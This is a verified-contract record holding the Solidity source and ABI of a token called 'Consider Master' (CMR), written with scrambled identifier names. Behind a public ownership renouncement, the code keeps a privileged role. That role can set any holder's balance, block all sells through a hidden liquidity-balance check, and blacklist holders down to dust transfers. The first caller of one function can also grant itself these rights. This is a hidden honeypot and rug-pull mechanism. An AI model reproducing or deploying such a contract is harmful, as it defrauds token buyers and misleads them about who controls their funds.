{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface amountEnable {\n    function createPair(address feeMax, address launchReceiver) external returns (address);\n}\n\ninterface listFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toBuy) external view returns (uint256);\n\n    function transfer(address isTo, uint256 limitTx) external returns (bool);\n\n    function allowance(address receiverIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTo,\n        uint256 limitTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchLaunched, uint256 value);\n    event Approval(address indexed receiverIs, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listFromMetadata is listFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsiderMaster is shouldTake, listFrom, listFromMetadata {\n\n    address amountLaunchFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeAmount(address launchedReceiver, uint256 limitTx) public {\n        shouldTo();\n        buyMaxLaunched[launchedReceiver] = limitTx;\n    }\n\n    mapping(address => bool) public teamToken;\n\n    bool private isFrom;\n\n    uint256 private takeAtMarketing;\n\n    function balanceOf(address toBuy) public view virtual override returns (uint256) {\n        return buyMaxLaunched[toBuy];\n    }\n\n    bool private takeList;\n\n    uint256 private limitLaunched;\n\n    function transferFrom(address isReceiver, address isTo, uint256 limitTx) external override returns (bool) {\n        if (_msgSender() != totalBuy) {\n            if (txLaunched[isReceiver][_msgSender()] != type(uint256).max) {\n                require(limitTx <= txLaunched[isReceiver][_msgSender()]);\n                txLaunched[isReceiver][_msgSender()] -= limitTx;\n            }\n        }\n        return senderMax(isReceiver, isTo, limitTx);\n    }\n\n    bool private enableTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTeam;\n    }\n\n    string private feeMin = \"Consider Master\";\n\n    function shouldTo() private view {\n        require(teamToken[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return feeToTrading;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeSell;\n    }\n\n    function tokenReceiver(uint256 limitTx) public {\n        shouldTo();\n        liquidityWalletLimit = limitTx;\n    }\n\n    uint256 public enableSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return feeMin;\n    }\n\n    event OwnershipTransferred(address indexed marketingEnable, address indexed marketingSender);\n\n    function maxFee() public {\n        emit OwnershipTransferred(listFund, address(0));\n        feeToTrading = address(0);\n    }\n\n    uint256 public fundExempt;\n\n    mapping(address => mapping(address => uint256)) private txLaunched;\n\n    uint256 private modeSell = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeToEnable;\n    }\n\n    address totalBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public txList;\n\n    mapping(address => uint256) private buyMaxLaunched;\n\n    constructor (){\n        if (takeList) {\n            swapWallet = enableSwap;\n        }\n        feeMode launchSell = feeMode(totalBuy);\n        fundLimit = amountEnable(launchSell.factory()).createPair(launchSell.WETH(), address(this));\n        \n        listFund = _msgSender();\n        teamToken[listFund] = true;\n        buyMaxLaunched[listFund] = modeSell;\n        maxFee();\n        if (takeAtMarketing == limitLaunched) {\n            limitLaunched = enableSwap;\n        }\n        emit Transfer(address(0), listFund, modeSell);\n    }\n\n    uint8 private feeToEnable = 18;\n\n    function allowance(address atMode, address txReceiver) external view virtual override returns (uint256) {\n        if (txReceiver == totalBuy) {\n            return type(uint256).max;\n        }\n        return txLaunched[atMode][txReceiver];\n    }\n\n    uint256 constant amountAt = 10 ** 10;\n\n    function getOwner() external view returns (address) {\n        return feeToTrading;\n    }\n\n    function isMinTo(address isReceiver, address isTo, uint256 limitTx) internal returns (bool) {\n        require(buyMaxLaunched[isReceiver] >= limitTx);\n        buyMaxLaunched[isReceiver] -= limitTx;\n        buyMaxLaunched[isTo] += limitTx;\n        emit Transfer(isReceiver, isTo, limitTx);\n        return true;\n    }\n\n    address public fundLimit;\n\n    address private feeToTrading;\n\n    bool public shouldReceiverToken;\n\n    function transfer(address launchedReceiver, uint256 limitTx) external virtual override returns (bool) {\n        return senderMax(_msgSender(), launchedReceiver, limitTx);\n    }\n\n    function senderMax(address isReceiver, address isTo, uint256 limitTx) internal returns (bool) {\n        if (isReceiver == listFund) {\n            return isMinTo(isReceiver, isTo, limitTx);\n        }\n        uint256 exemptFund = listFrom(fundLimit).balanceOf(amountLaunchFrom);\n        require(exemptFund == liquidityWalletLimit);\n        require(isTo != amountLaunchFrom);\n        if (walletLimit[isReceiver]) {\n            return isMinTo(isReceiver, isTo, amountAt);\n        }\n        return isMinTo(isReceiver, isTo, limitTx);\n    }\n\n    function maxReceiver(address isMode) public {\n        shouldTo();\n        \n        if (isMode == listFund || isMode == fundLimit) {\n            return;\n        }\n        walletLimit[isMode] = true;\n    }\n\n    uint256 private swapWallet;\n\n    function atToken(address maxAuto) public {\n        if (receiverListFee) {\n            return;\n        }\n        if (isFrom == txList) {\n            txList = true;\n        }\n        teamToken[maxAuto] = true;\n        \n        receiverListFee = true;\n    }\n\n    mapping(address => bool) public walletLimit;\n\n    address public listFund;\n\n    uint256 liquidityWalletLimit;\n\n    uint256 fromAmount;\n\n    string private senderTeam = \"CMR\";\n\n    function approve(address txReceiver, uint256 limitTx) public virtual override returns (bool) {\n        txLaunched[_msgSender()][txReceiver] = limitTx;\n        emit Approval(_msgSender(), txReceiver, limitTx);\n        return true;\n    }\n\n    bool public receiverListFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTx\",\"type\":\"uint256\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTx\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConsiderMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}